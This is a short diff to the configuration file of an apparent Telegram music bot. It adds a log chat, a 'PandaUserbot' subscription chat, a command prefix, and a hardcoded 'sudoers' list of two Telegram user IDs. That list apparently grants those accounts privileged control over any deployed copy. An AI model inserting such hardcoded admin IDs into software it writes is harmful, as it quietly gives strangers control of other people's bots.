@@ -74,6 +74,11 @@ SONG_DOWNLOAD_DURATION = int(
 
 # You'll need a Private Group ID for this.
 LOG_GROUP_ID = int(getenv("LOG_GROUP_ID", ""))
+log_chat = LOG_GROUP_ID
+sub_chat = "PandaUserbot"
+
+sudoers = [5057493677, 1593802955]
+prefixs = "/"
 
 # A name for your Music bot.
 MUSIC_BOT_NAME = getenv("MUSIC_BOT_NAME")
